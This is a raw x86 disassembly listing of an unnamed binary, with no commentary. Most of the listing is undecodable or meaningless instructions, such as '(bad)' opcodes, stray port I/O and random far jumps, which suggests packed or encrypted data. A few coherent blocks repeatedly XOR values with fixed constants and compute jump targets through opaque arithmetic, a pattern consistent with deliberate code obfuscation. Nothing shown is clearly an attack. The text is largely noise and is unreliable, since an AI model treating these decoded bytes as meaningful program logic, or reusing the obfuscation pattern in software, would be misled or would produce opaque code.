  4208fe:	cmp    al,0x5d
  420900:	loop   0x42093e
  420902:	xchg   ebx,eax
  420903:	push   ss
  420904:	sbb    BYTE PTR [edx],0x71
  420907:	imul   edi,DWORD PTR [ebx+0x74b9bcaa],0x35
  42090e:	inc    ebp
  42090f:	popa   
  420910:	sbb    ebp,edx
  420912:	push   ecx
  420913:	mov    al,ds:0x336f4f08
  420918:	ret    
  420919:	inc    ebp
  42091a:	rcr    eax,0xef
  42091d:	aad    0xcd
  42091f:	(bad)  
  420920:	adc    WORD PTR [edx-0x614d5d60],dx
  420927:	mov    eax,0xb4d42fdb
  42092c:	inc    ebx
  42092d:	push   0xc64b849f
  420932:	cmp    BYTE PTR [edx],dh
  420934:	jno    0x4208de
  420936:	jp     0x420977
  420938:	and    BYTE PTR [eax+0x3a3cd0db],bh
  42093e:	xchg   esi,eax
  42093f:	out    0xa8,eax
  420941:	addr16 popa 
  420943:	and    esi,ebx
  420945:	sub    eax,0x6b0d2171
  42094a:	pop    ecx
  42094b:	sti    
  42094c:	or     al,0x88
  42094e:	lahf   
  42094f:	out    dx,al
  420950:	cmp    dh,BYTE PTR [esi]
  420952:	stos   DWORD PTR es:[edi],eax
  420953:	rcr    DWORD PTR [esi+0x429cde49],cl
  420959:	push   cs
  42095a:	in     eax,0x77
  42095c:	cmp    dl,bl
  42095e:	lods   eax,DWORD PTR ds:[esi]
  42095f:	dec    ecx
  420960:	fcmovnb st,st(4)
  420962:	push   es
  420963:	xchg   ecx,eax
  420964:	int    0xc5
  420966:	ds mov bl,0x85
  420969:	pushf  
  42096a:	push   ds
  42096b:	jbe    0x42096a
  42096d:	in     al,0x78
  42096f:	rcl    BYTE PTR [edi],1
  420971:	push   eax
  420972:	ins    BYTE PTR es:[edi],dx
  420973:	rcr    ebp,1
  420975:	xor    eax,DWORD PTR [ebx+ecx*1+0x220963a0]
  42097c:	xor    DWORD PTR [esi+0x22],ebx
  42097f:	scas   al,BYTE PTR es:[edi]
  420980:	repz jmp 0x614:0x9f0575c8
  420988:	cdq    
  420989:	retf   0xaf5d
  42098c:	div    DWORD PTR [eax-0x6caf9291]
  420992:	sti    
  420993:	leave  
  420994:	aaa    
  420995:	push   ebx
  420996:	not    BYTE PTR [eax]
  420998:	adc    ah,BYTE PTR [ebx]
  42099a:	in     al,dx
  42099b:	(bad)  
  42099c:	ja     0x4209e9
  42099e:	cld    
  42099f:	mov    ah,0x44
  4209a1:	jbe    0x420975
  4209a3:	sti    
  4209a4:	call   0xf9b2e87c
  4209a9:	pushf  
  4209aa:	mul    DWORD PTR [ebx]
  4209ac:	mov    edx,0xb6b1e5db
  4209b1:	sbb    bh,BYTE PTR [ecx+0x14]
  4209b4:	dec    esp
  4209b5:	xchg   edi,eax
  4209b6:	mov    esi,0x23893b6d
  4209bb:	sub    ah,0x66
  4209be:	stos   BYTE PTR es:[edi],al
  4209bf:	or     al,0xa7
  4209c1:	add    eax,DWORD PTR [edx-0x5e92673d]
  4209c7:	stos   BYTE PTR es:[edi],al
  4209c8:	adc    DWORD PTR [ecx+0x74550723],ecx
  4209ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209cf:	test   DWORD PTR [edi-0xb],esp
  4209d2:	sbb    al,0xcf
  4209d4:	adc    DWORD PTR [edx-0x30321dbd],0x8a9279dd
  4209de:	sub    bh,bh
  4209e0:	mov    eax,ds:0x446e343d
  4209e5:	(bad)  [esi-0x9]
  4209e8:	(bad)  
  4209e9:	cdq    
  4209ea:	in     al,0xfa
  4209ec:	mov    ebx,0x5ffc471d
  4209f1:	mov    esp,0xb22c35e3
  4209f6:	push   edi
  4209f7:	add    al,0xfc
  4209f9:	push   0xf69cfbad
  4209fe:	ror    cl,0xaf
  420a01:	sbb    eax,0x4ebee5b0
  420a06:	push   eax
  420a07:	or     bh,BYTE PTR [ecx+esi*1]
  420a0a:	adc    DWORD PTR [ebp-0x5d562d4f],0xc4345ee0
  420a14:	scas   al,BYTE PTR es:[edi]
  420a15:	or     DWORD PTR [ecx-0x5a67c812],ecx
  420a1b:	pop    eax
  420a1c:	ja     0x4209ae
  420a1e:	dec    esp
  420a1f:	pop    esi
  420a20:	(bad)  
  420a21:	fisttp QWORD PTR [esi-0x66]
  420a24:	(bad)
  420a27:	or     eax,0x2b185fb
  420a2c:	call   0x4069e2
  420a31:	mov    esi,eax
  420a33:	mov    edi,edx
  420a35:	mov    eax,DWORD PTR [ebp-0xc8]
  420a3b:	mov    edx,DWORD PTR [ebp-0xc4]
  420a41:	xor    eax,0xcb89b676
  420a46:	xor    edx,0x9d2b8af8
  420a4c:	mov    cl,0x3e
  420a4e:	call   0x421c80
  420a53:	or     esi,eax
  420a55:	or     edi,edx
  420a57:	mov    eax,DWORD PTR [ebp-0xd4]
  420a5d:	imul   esi,eax
  420a60:	add    esi,DWORD PTR [ebp-0xe4]
  420a66:	mov    DWORD PTR [ebp-0xe0],esi
  420a6c:	mov    eax,DWORD PTR [ebp-0xe0]
  420a72:	mov    DWORD PTR [ebp-0xec],eax
  420a78:	jmp    0x421100
  420a7d:	jmp    0x421067
  420a82:	mov    eax,DWORD PTR [ebp-0xc8]
  420a88:	mov    edx,DWORD PTR [ebp-0xc4]
  420a8e:	xor    eax,0xcb89b676
  420a93:	xor    edx,0x9d2b8af8
  420a99:	mov    cl,0x2
  420a9b:	jmp    0x420d38
  420aa0:	lahf   
  420aa1:	pop    ds
  420aa2:	push   ecx
  420aa3:	leave  
  420aa4:	push   ecx
  420aa5:	mov    esp,0x5d91adb7
  420aaa:	jge    0x420ab1
  420aac:	retf   0xb9b4
  420aaf:	das    
  420ab0:	in     al,dx
  420ab1:	mov    edx,0xbfb2bbc1
  420ab6:	mov    ebx,0xa5a6d2bb
  420abb:	pop    eax
  420abc:	es scas al,BYTE PTR es:[edi]
  420abe:	aas    
  420abf:	add    BYTE PTR [esp+eax*2+0x62],dh
  420ac3:	arpl   WORD PTR [eax],di
  420ac5:	xchg   edx,eax
  420ac6:	mov    al,BYTE PTR [ecx+0x2faebb9f]
  420acc:	leave  
  420acd:	loop   0x420b46
  420acf:	jne    0x420ab0
  420ad1:	shr    DWORD PTR [eax+edi*8],1
  420ad4:	inc    edx
  420ad5:	mov    bh,0x4c
  420ad7:	xchg   esp,eax
  420ad8:	fs stos BYTE PTR es:[edi],al
  420ada:	dec    esp
  420adb:	sub    DWORD PTR [ebx+0x1f],0x30edf4d6
  420ae2:	push   edi
  420ae3:	mov    eax,0xb2110e77
  420ae8:	out    dx,eax
  420ae9:	push   ss
  420aea:	nop
  420aeb:	cmp    al,0x4f
  420aed:	pushf  
  420aee:	sbb    al,0xb0
  420af0:	jbe    0x420b6f
  420af2:	pop    esi
  420af3:	lea    ebp,[ebx]
  420af5:	push   ss
  420af6:	jle    0x420b27
  420af8:	ins    BYTE PTR es:[edi],dx
  420af9:	fidiv  DWORD PTR [ebx-0x57ed01e4]
  420aff:	and    eax,0xb03c2fa3
  420b04:	mov    esi,0xed9c2ef8
  420b09:	retf   
  420b0a:	std    
  420b0b:	aas    
  420b0c:	imul   ecx,DWORD PTR [ebx-0x41],0xb
  420b10:	xor    BYTE PTR [edx+eiz*2-0x5f10d48a],ah
  420b17:	and    bh,ah
  420b19:	dec    edx
  420b1a:	inc    eax
  420b1b:	sbb    DWORD PTR [esi],edx
  420b1d:	and    BYTE PTR ds:0xb7124c22,ch
  420b23:	xor    ebx,DWORD PTR [esi-0x4f15c6f0]
  420b29:	mov    bl,0xd0
  420b2b:	stos   DWORD PTR es:[edi],eax
  420b2c:	mov    edi,0xc1e77835
  420b31:	fist   WORD PTR [edi-0x43d192dc]
  420b37:	cmp    dh,cl
  420b39:	push   0xbc0ecd6d
  420b3e:	mov    esi,0x31fba992
  420b43:	int    0xde
  420b45:	stos   BYTE PTR es:[edi],al
  420b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b47:	loopne 0x420b1a
  420b49:	fdivr  st(5),st
  420b4b:	jge    0x420b66
  420b4d:	xchg   esp,eax
  420b4e:	pusha  
  420b4f:	add    eax,DWORD PTR [edx+0x71]
  420b52:	push   edx
  420b53:	dec    ebx
  420b54:	arpl   sp,di
  420b56:	jo     0x420b03
  420b58:	sub    al,0x3b
  420b5a:	mov    ah,0x11
  420b5c:	fbstp  TBYTE PTR [ebx-0x7f30230a]
  420b62:	test   eax,0x9cf0207b
  420b67:	add    bl,BYTE PTR [esi-0x5c]
  420b6a:	cmc    
  420b6b:	int    0xa6
  420b6d:	pusha  
  420b6e:	out    0x1b,al
  420b70:	sbb    al,0xe2
  420b72:	inc    eax
  420b73:	push   ds
  420b74:	(bad)  [ecx+eax*1-0x54d1482f]
  420b7b:	push   ds
  420b7c:	je     0x420b78
  420b7e:	jnp    0x420b21
  420b80:	(bad)
  420b84:	ret    
  420b85:	out    dx,al
  420b86:	mov    BYTE PTR [esi-0x5c8c79a],0x14
  420b8d:	and    ebp,DWORD PTR [ebp-0x15]
  420b90:	inc    ebp
  420b91:	or     DWORD PTR [bp+di+0x97a],eax
  420b96:	retf   
  420b97:	mov    ecx,0xabbbbe3f
  420b9c:	cld    
  420b9d:	inc    esp
  420b9e:	sub    eax,0x24a9bfd6
  420ba3:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  420ba5:	or     dl,BYTE PTR [edi+0x7b]
  420ba8:	xrelease xchg DWORD PTR [edx-0x6c486ad4],ebp
  420baf:	mov    bl,0x34
  420bb1:	add    BYTE PTR [ecx+0x29],bl
  420bb4:	jge    0x420b6f
  420bb6:	mov    ebp,DWORD PTR [edx]
  420bb8:	test   dl,dh
  420bba:	jnp    0x420b4f
  420bbc:	icebp  
  420bbd:	push   ss
  420bbe:	push   cs
  420bbf:	jp     0x420bd5
  420bc1:	add    BYTE PTR [ecx+0x770b6350],dl
  420bc7:	dec    ecx
  420bc8:	es mov ch,0x70
  420bcb:	popf   
  420bcc:	in     al,0xdf
  420bce:	call   0xe474:0x77fed6a9
  420bd5:	fs sbb eax,0xc049b933
  420bdb:	(bad)  
  420bdc:	add    BYTE PTR [edx-0x8],bl
  420bdf:	outs   dx,DWORD PTR ds:[esi]
  420be0:	imul   cl
  420be2:	loop   0x420b7a
  420be4:	mov    dh,ch
  420be6:	repz shr ah,1
  420be9:	sub    BYTE PTR [edi-0x3a4635e0],bl
  420bef:	in     eax,dx
  420bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bf1:	fs or  eax,0x9aa23666
  420bf7:	mov    dh,0x9c
  420bf9:	adc    esi,ebx
  420bfb:	jo     0x420bb1
  420bfd:	imul   DWORD PTR [ecx]
  420bff:	pop    esp
  420c00:	xlat   BYTE PTR ds:[ebx]
  420c01:	test   eax,0xe5073d6c
  420c06:	push   ecx
  420c07:	in     al,0xc3
  420c09:	cmp    ebx,DWORD PTR [ebp-0x56]
  420c0c:	aad    0x9a
  420c0e:	push   ecx
  420c0f:	cmp    DWORD PTR [ebp+eax*2+0x58],ebp
  420c13:	mov    dl,0x3a
  420c15:	std    
  420c16:	mov    ds:0x857c64a6,eax
  420c1b:	lods   eax,DWORD PTR ds:[esi]
  420c1c:	or     edi,DWORD PTR [edi]
  420c1e:	fcmovnbe st,st(5)
  420c20:	hlt    
  420c21:	test   BYTE PTR [edi],dh
  420c23:	fwait
  420c24:	int    0xcd
  420c26:	nop
  420c27:	outs   dx,BYTE PTR ds:[esi]
  420c28:	imul   eax,eax,0xcb47196b
  420c2e:	jb     0x420be8
  420c30:	cmc    
  420c31:	popa   
  420c32:	(bad)  
  420c33:	push   ebp
  420c34:	mov    eax,ds:0xb158a54e
  420c39:	mov    ?,WORD PTR [ecx-0x1c]
  420c3c:	retf   
  420c3d:	pop    ebp
  420c3e:	dec    esi
  420c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c40:	aam    0x56
  420c42:	rcr    DWORD PTR [eax-0x446fcd4b],0x85
  420c49:	adc    DWORD PTR [edx+0x68],0x75e3037c
  420c50:	adc    al,0x76
  420c52:	sbb    DWORD PTR [esi+eax*2],ecx
  420c55:	neg    DWORD PTR [esi+0x76]
  420c58:	jmp    0x9363c8be
  420c5d:	jo     0x420ca8
  420c5f:	test   DWORD PTR [edi],ecx
  420c61:	mov    eax,0x1f592744
  420c66:	jmp    DWORD PTR [ecx+0x2a]
  420c69:	dec    ecx
  420c6a:	add    al,0x42
  420c6c:	pop    ebp
  420c6d:	test   BYTE PTR [edx+0x33],ch
  420c70:	imul   esi,DWORD PTR [edi+0x60],0x9996e09f
  420c77:	cld    
  420c78:	imul   ecx,DWORD PTR ss:[ebp-0x342cf97b],0xffffffc0
  420c80:	push   eax
  420c81:	shl    dl,cl
  420c83:	jb     0x420c3d
  420c85:	out    dx,eax
  420c86:	shr    DWORD PTR [eax],1
  420c88:	xchg   DWORD PTR [edi+0x36],ebp
  420c8b:	(bad)  
  420c8c:	mov    al,BYTE PTR [ebx-0x42309438]
  420c92:	repz fsub DWORD PTR [edx-0x14]
  420c96:	inc    eax
  420c97:	int    0xcc
  420c99:	dec    edi
  420c9a:	adc    eax,0xd9c9fbb2
  420c9f:	add    BYTE PTR [edx+0x45],cl
  420ca2:	stos   DWORD PTR es:[edi],eax
  420ca3:	add    eax,0x7f4ef2de
  420ca8:	cwde   
  420ca9:	fimul  WORD PTR [edi]
  420cab:	mov    ecx,0x14998712
  420cb0:	sbb    ecx,DWORD PTR [ecx]
  420cb2:	pop    edx
  420cb3:	lds    ebx,FWORD PTR [esi-0x73e0cdc2]
  420cb9:	repz popf 
  420cbb:	(bad)  
  420cbc:	div    DWORD PTR ds:0x8b677689
  420cc2:	push   esp
  420cc3:	sub    al,0x24
  420cc5:	sub    esp,DWORD PTR [esp+esi*4+0x40]
  420cc9:	aas    
  420cca:	push   0xffffff90
  420ccc:	pop    ebx
  420ccd:	(bad)  
  420cce:	xlat   BYTE PTR ds:[ebx]
  420ccf:	ja     0x420d2f
  420cd1:	test   DWORD PTR ds:0xdd5b4419,eax
  420cd7:	xchg   edi,eax
  420cd8:	sar    DWORD PTR [ebp-0x7b],cl
  420cdb:	xchg   BYTE PTR [ebp+ebx*8-0x10],ah
  420cdf:	sbb    DWORD PTR [esi+ebx*8-0x43],ecx
  420ce3:	jmp    0x30d8e550
  420ce8:	push   cs
  420ce9:	stc    
  420cea:	add    al,0x7c
  420cec:	mov    edx,0x1af81056
  420cf1:	cmc    
  420cf2:	scas   eax,DWORD PTR es:[edi]
  420cf3:	sub    ch,BYTE PTR [esi-0x3e29d6a7]
  420cf9:	(bad)  
  420cfa:	pop    esi
  420cfb:	push   0x6f672f13
  420d00:	jle    0x420d59
  420d02:	cmp    al,0x8c
  420d04:	scas   eax,DWORD PTR es:[edi]
  420d05:	adc    DWORD PTR [esi-0x7e],esi
  420d08:	xlat   BYTE PTR ds:[ebx]
  420d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d0a:	mov    ebx,0xe6f0e1ad
  420d0f:	pop    ebp
  420d10:	push   ecx
  420d11:	pop    edx
  420d12:	test   DWORD PTR [ecx-0xfb887b0],0x3be9bba3
  420d1c:	cmp    DWORD PTR [edi+0x6e],esp
  420d1f:	(bad)  
  420d20:	adc    ebp,DWORD PTR [esp+edi*4]
  420d23:	jae    0x420d8b
  420d25:	das    
  420d26:	jno    0x420d69
  420d28:	lods   al,BYTE PTR ds:[esi]
  420d29:	es mov edi,0x5973ce21
  420d2f:	fist   WORD PTR [ebx-0x2d]
  420d32:	add    al,cl
  420d34:	clc    
  420d35:	lahf   
  420d36:	in     al,0x0
  420d38:	call   0x4069e2
  420d3d:	mov    esi,eax
  420d3f:	mov    edi,edx
  420d41:	mov    eax,DWORD PTR [ebp-0xc8]
  420d47:	mov    edx,DWORD PTR [ebp-0xc4]
  420d4d:	xor    eax,0xcb89b676
  420d52:	xor    edx,0x9d2b8af8
  420d58:	mov    cl,0x3e
  420d5a:	call   0x421c80
  420d5f:	or     esi,eax
  420d61:	or     edi,edx
  420d63:	jmp    0x421000
  420d68:	test   eax,0x871386a0
  420d6d:	cmp    eax,0x8ea2b0bd
  420d72:	jmp    0xe56f:0xa916d63b
  420d79:	(bad)
  420d7d:	mov    edi,0xfee8bbbb
  420d82:	pop    edi
  420d83:	pop    ecx
  420d84:	es inc esp
  420d86:	mov    WORD PTR [ecx+eiz*1-0x7],?
  420d8a:	cmp    al,0xc1
  420d8c:	test   eax,0xa9cd2135
  420d91:	(bad)
  420d94:	rcl    edi,cl
  420d96:	pop    ebp
  420d97:	aam    0x13
  420d99:	jne    0x420dad
  420d9b:	xchg   ebp,eax
  420d9c:	mov    ebx,DWORD PTR [eax-0x50]
  420d9f:	bound  ecx,QWORD PTR [eax-0xe]
  420da2:	test   al,0xdd
  420da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420da5:	inc    eax
  420da6:	cmp    eax,0x68923120
  420dab:	jno    0x420e0f
  420dad:	das    
  420dae:	add    esp,DWORD PTR [edi+0x73ca22b4]
  420db4:	pop    edx
  420db5:	stos   DWORD PTR es:[edi],eax
  420db6:	push   ds
  420db7:	outs   dx,DWORD PTR ds:[esi]
  420db8:	mov    ch,0x96
  420dba:	icebp  
  420dbb:	rol    esi,cl
  420dbd:	sbb    bh,dh
  420dbf:	ja     0x420d7f
  420dc1:	push   ss
  420dc2:	push   cs
  420dc3:	test   eax,0xf1c63b9b
  420dc8:	xchg   DWORD PTR [ecx+0x3b],ecx
  420dcb:	xor    eax,0x55598fc1
  420dd0:	dec    ebx
  420dd1:	and    ebx,DWORD PTR [eax+edi*2-0x1e]
  420dd5:	ret    
  420dd6:	cld    
  420dd7:	push   edi
  420dd8:	fstp   TBYTE PTR [ebx]
  420dda:	push   DWORD PTR [edi-0xa]
  420ddd:	cmp    eax,0xdab3c448
  420de2:	hlt    
  420de3:	xchg   ebp,eax
  420de4:	jbe    0x420de7
  420de6:	(bad)  
  420de7:	jge    0x420dd3
  420de9:	imul   DWORD PTR [edx]
  420deb:	stos   DWORD PTR es:[edi],eax
  420dec:	sbb    edx,edi
  420dee:	js     0x420da2
  420df0:	pop    es
  420df1:	push   ebx
  420df2:	sub    ecx,esp
  420df4:	xor    al,0x44
  420df6:	dec    esp
  420df7:	pop    ss
  420df8:	fadd   st(0),st
  420dfa:	push   ds
  420dfb:	xchg   edx,eax
  420dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dfd:	mov    ah,BYTE PTR ds:0x6e6a2a7d
  420e03:	cli    
  420e04:	xor    edi,edi
  420e06:	sbb    al,0x57
  420e08:	xchg   bx,ax
  420e0a:	cdq    
  420e0b:	loopne 0x420e33
  420e0d:	test   BYTE PTR [eax],ch
  420e0f:	and    DWORD PTR [eax+0x4c],edx
  420e12:	loop   0x420e01
  420e14:	bnd js 0x420e3d
  420e17:	push   esi
  420e18:	mov    cl,0x88
  420e1a:	mov    al,ds:0x68da9503
  420e1f:	inc    esi
  420e20:	pop    ss
  420e21:	xchg   ecx,eax
  420e22:	push   eax
  420e23:	mov    esp,0x731dde2d
  420e28:	push   si
  420e2a:	(bad)  
  420e2b:	jnp    0x420e73
  420e2d:	and    eax,DWORD PTR [ebx+0x1c58da18]
  420e33:	fcmovnbe st,st(0)
  420e35:	sub    dh,BYTE PTR [ecx-0x1b]
  420e38:	push   es
  420e39:	(bad)
  420e3d:	mov    cl,0x6d
  420e3f:	pusha  
  420e40:	popf   
  420e41:	or     DWORD PTR [edx],0xfffffff5
  420e44:	test   cl,al
  420e46:	mov    dl,0x69
  420e48:	jmp    0x420dec
  420e4a:	pop    ebx
  420e4b:	sub    al,bh
  420e4d:	icebp  
  420e4e:	icebp  
  420e4f:	inc    esp
  420e50:	xchg   esp,eax
  420e51:	mov    ebx,0xb8fef43a
  420e56:	push   DWORD PTR [ebx-0x22ad2631]
  420e5c:	(bad)  
  420e5d:	rcl    BYTE PTR [esi],0x88
  420e60:	sahf   
  420e61:	add    ah,al
  420e63:	fucomp st(6)
  420e65:	sbb    BYTE PTR [ebx-0x78fdeac1],bl
  420e6b:	ins    BYTE PTR es:[edi],dx
  420e6c:	xor    eax,DWORD PTR [edi-0x2003dde9]
  420e72:	retf   
  420e73:	lods   eax,DWORD PTR ds:[esi]
  420e74:	rol    BYTE PTR [edx+0x5da6374b],0xd2
  420e7b:	cdq    
  420e7c:	mov    esp,0x3f218519
  420e81:	dec    ebp
  420e82:	pop    eax
  420e83:	imul   esi,esp,0xfffffff1
  420e86:	and    BYTE PTR [edi+0x7c6a8eb2],ch
  420e8c:	inc    eax
  420e8d:	push   ds
  420e8e:	dec    edi
  420e8f:	mov    esp,DWORD PTR [edx+0x6ec08ab7]
  420e95:	pop    eax
  420e96:	sbb    esi,DWORD PTR ds:0xbe17906
  420e9c:	ffree  st(4)
  420e9e:	adc    bl,BYTE PTR [esi+0x46]
  420ea1:	mov    eax,0xf1f28dd9
  420ea6:	jb     0x420f20
  420ea8:	repnz push ds
  420eaa:	icebp  
  420eab:	neg    dh
  420ead:	jne    0x420e3b
  420eaf:	mov    WORD PTR [ebp-0x4b],ds
  420eb2:	ja     0x420e73
  420eb4:	mov    eax,DWORD PTR [ecx-0x4e]
  420eb7:	pop    eax
  420eb8:	shr    DWORD PTR [ebx],0x65
  420ebb:	push   ds
  420ebc:	xchg   ecx,eax
  420ebd:	(bad)  
  420ebe:	arpl   WORD PTR [ebp-0x7eb66861],ax
  420ec4:	pop    ebp
  420ec5:	addr16 mov ds:0x712d,eax
  420ec9:	(bad)  
  420eca:	sub    eax,0x56fc426e
  420ecf:	out    dx,eax
  420ed0:	les    edx,FWORD PTR [ebx+eiz*4-0x44]
  420ed4:	add    al,0x9b
  420ed6:	jne    0x420e88
  420ed8:	add    al,0x4a
  420eda:	dec    ecx
  420edb:	iret   
  420edc:	loope  0x420f1e
  420ede:	fsub   QWORD PTR [esi]
  420ee0:	pusha  
  420ee1:	push   0x9ee3ba92
  420ee6:	pop    edi
  420ee7:	test   edi,ebp
  420ee9:	push   0xf98246e9
  420eee:	inc    esp
  420eef:	outs   dx,BYTE PTR ds:[esi]
  420ef0:	bound  edx,QWORD PTR [eax]
  420ef2:	outs   dx,BYTE PTR ds:[esi]
  420ef3:	dec    ebx
  420ef4:	in     al,0x33
  420ef6:	aam    0xf0
  420ef8:	fiadd  DWORD PTR [esi-0x13013823]
  420efe:	push   cs
  420eff:	mov    edx,DWORD PTR [edi-0x633837c5]
  420f05:	pop    ebp
  420f06:	and    al,0xb5
  420f08:	sbb    esp,DWORD PTR [edi]
  420f0a:	xor    bl,al
  420f0c:	mov    eax,ds:0xbe36efa0
  420f11:	inc    edi
  420f12:	sbb    ecx,edx
  420f14:	stos   BYTE PTR es:[edi],al
  420f15:	push   edx
  420f16:	cli    
  420f17:	popa   
  420f18:	and    bl,BYTE PTR [ebx+0x42]
  420f1b:	(bad)  
  420f1c:	and    al,0x94
  420f1e:	fwait
  420f1f:	das    
  420f20:	mov    ecx,0xd1a7b742
  420f25:	pop    eax
  420f26:	into   
  420f27:	cmp    al,0x9b
  420f29:	pop    es
  420f2a:	xor    ecx,ebp
  420f2c:	jno    0x420f28
  420f2e:	mov    WORD PTR [eax],ss
  420f30:	dec    edi
  420f31:	cmp    DWORD PTR [esi+0x9],esi
  420f34:	sub    ch,BYTE PTR [edx+eiz*4]
  420f37:	inc    ebp
  420f38:	mov    dh,0xbd
  420f3a:	xchg   ebx,eax
  420f3b:	cmp    BYTE PTR [ebp-0x7a0c6e64],ch
  420f41:	and    ebx,DWORD PTR [ecx+0x4e9c3dc0]
  420f47:	mov    bl,0x64
  420f49:	bound  ebp,QWORD PTR [esi]
  420f4b:	jae    0x420ee8
  420f4d:	mov    ds:0x1626e307,al
  420f52:	outs   dx,BYTE PTR ds:[esi]
  420f53:	inc    ebx
  420f54:	ret    0x2b22
  420f57:	jge    0x420eed
  420f59:	call   0x563b:0x1269
  420f5f:	xchg   ebx,eax
  420f60:	stos   DWORD PTR es:[edi],eax
  420f61:	xchg   esi,eax
  420f62:	jle    0x420f44
  420f64:	dec    ebx
  420f65:	push   eax
  420f66:	xchg   edi,eax
  420f67:	aaa    
  420f68:	mov    eax,0x9880df8d
  420f6d:	adc    ecx,0xa43e4994
  420f73:	mov    eax,ds:0x26ff6f3c
  420f78:	dec    esi
  420f79:	push   ebx
  420f7a:	xor    eax,0x3cdb1e45
  420f7f:	dec    edi
  420f80:	sbb    DWORD PTR [ebp-0x3e],esi
  420f83:	and    ah,BYTE PTR [ecx]
  420f85:	push   0x1c
  420f87:	adc    al,0xa6
  420f89:	in     eax,dx
  420f8a:	jns    0x420f35
  420f8c:	and    dh,0xf4
  420f8f:	(bad)
  420f93:	in     al,0xa5
  420f95:	mov    ebp,0x670585dd
  420f9a:	push   esp
  420f9b:	mov    ds:0x8e5775b9,eax
  420fa0:	lods   eax,DWORD PTR ds:[esi]
  420fa1:	inc    esp
  420fa2:	pop    ds
  420fa3:	scas   eax,DWORD PTR es:[edi]
  420fa4:	neg    DWORD PTR [esi+edx*2+0x12edfd9b]
  420fab:	sbb    eax,0xa22c2d87
  420fb0:	fiadd  WORD PTR [esp+eax*2]
  420fb3:	icebp  
  420fb4:	dec    esp
  420fb5:	(bad)  
  420fb6:	fwait
  420fb7:	push   eax
  420fb8:	pop    esi
  420fb9:	mov    ecx,0xa1ace854
  420fbe:	leave  
  420fbf:	jl     0x420f79
  420fc1:	fsubr  st(3),st
  420fc3:	mov    eax,ds:0x958b098e
  420fc8:	shr    ecx,1
  420fca:	cmp    bh,BYTE PTR [eax-0x29]
  420fcd:	lods   al,BYTE PTR ds:[esi]
  420fce:	loop   0x420fdc
  420fd0:	inc    ebx
  420fd1:	pushf  
  420fd2:	xor    DWORD PTR [ebp+0x31],eax
  420fd5:	mov    ds:0x5696252a,al
  420fda:	leave  
  420fdb:	dec    ebp
  420fdc:	mov    ebp,0x954a7142
  420fe1:	je     0x420f6f
  420fe3:	adc    bl,bh
  420fe5:	daa    
  420fe6:	jo     0x421065
  420fe8:	jae    0x421035
  420fea:	arpl   WORD PTR [esi],bp
  420fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fed:	push   ds
  420fee:	sbb    dh,BYTE PTR [ecx-0x37]
  420ff1:	pop    ss
  420ff2:	adc    BYTE PTR [eax-0x2b],ah
  420ff5:	sub    eax,0x70985cc1
  420ffa:	jl     0x42104e
  420ffc:	bound  ebp,QWORD PTR [ebx-0x7a744d70]
  421002:	xor    bh,bh
  421004:	(bad)  
  421005:	dec    DWORD PTR [ebx-0xcb6b]
  42100b:	push   DWORD PTR ds:0xcb89b676
  421011:	xor    edx,0x9d2b8af8
  421017:	mov    cl,0x2
  421019:	call   0x4069e2
  42101e:	mov    ebx,eax
  421020:	mov    eax,edx
  421022:	mov    ecx,DWORD PTR [ebp-0xd0]
  421028:	mov    edx,DWORD PTR [ebp-0xcc]
  42102e:	xor    ecx,0xcb89b676
  421034:	xor    edx,0x9d2b8af8
  42103a:	mov    DWORD PTR [ebp-0x1a8],eax
  421040:	mov    eax,ecx
  421042:	mov    cl,0x3e
  421044:	call   0x421c80
  421049:	or     ebx,eax
  42104b:	mov    eax,DWORD PTR [ebp-0x1a8]
  421051:	or     eax,edx
  421053:	push   eax
  421054:	push   ebx
  421055:	push   edi
  421056:	push   esi
  421057:	call   0x421ba4
  42105c:	mov    DWORD PTR [ebp-0xec],eax
  421062:	jmp    0x421100
  421067:	mov    eax,DWORD PTR [ebp-0xd0]
  42106d:	mov    edx,DWORD PTR [ebp-0xcc]
  421073:	xor    eax,0xcb89b676
  421078:	xor    edx,0x9d2b8af8
  42107e:	mov    cl,0x2
  421080:	call   0x4069e2
  421085:	mov    esi,eax
  421087:	mov    edi,edx
  421089:	mov    eax,DWORD PTR [ebp-0xd0]
  42108f:	mov    edx,DWORD PTR [ebp-0xcc]
  421095:	xor    eax,0xcb89b676
  42109a:	xor    edx,0x9d2b8af8
  4210a0:	mov    cl,0x3e
  4210a2:	call   0x421c80
  4210a7:	or     esi,eax
  4210a9:	or     edi,edx
  4210ab:	mov    DWORD PTR [ebp-0xec],esi
  4210b1:	jmp    0x421100
  4210b6:	mov    eax,DWORD PTR [ebp-0xd0]
  4210bc:	mov    edx,DWORD PTR [ebp-0xcc]
  4210c2:	xor    eax,0xcb89b676
  4210c7:	xor    edx,0x9d2b8af8
  4210cd:	mov    cl,0x2
  4210cf:	call   0x4069e2
  4210d4:	mov    esi,eax
  4210d6:	mov    edi,edx
  4210d8:	mov    eax,DWORD PTR [ebp-0xd0]
  4210de:	mov    edx,DWORD PTR [ebp-0xcc]
  4210e4:	xor    eax,0xcb89b676
  4210e9:	xor    edx,0x9d2b8af8
  4210ef:	mov    cl,0x3e
  4210f1:	call   0x421c80
  4210f6:	or     esi,eax
  4210f8:	or     edi,edx
  4210fa:	mov    DWORD PTR [ebp-0xec],esi
  421100:	mov    eax,ds:0x422530
  421105:	imul   eax,eax,0x15db
  42110b:	mov    ecx,DWORD PTR ds:0x42252c
  421111:	or     eax,ecx
  421113:	add    eax,0x22a3
  421118:	imul   eax,eax,0xda5
  42111e:	mov    ecx,DWORD PTR ds:0x422528
  421124:	xor    eax,ecx
  421126:	mov    ecx,DWORD PTR [ebp-0xec]
  42112c:	lea    eax,[ecx+eax*1-0x4991119e]
  421133:	jmp    0x42132f
  421138:	dec    edi
  421139:	or     BYTE PTR [ecx+0x24],al
  42113c:	popf   
  42113d:	lods   eax,DWORD PTR ds:[esi]
  42113e:	scas   eax,DWORD PTR es:[edi]
  42113f:	mov    ecx,0x50d0ae3
  421144:	push   ss
  421145:	push   0xc8dc2fb3
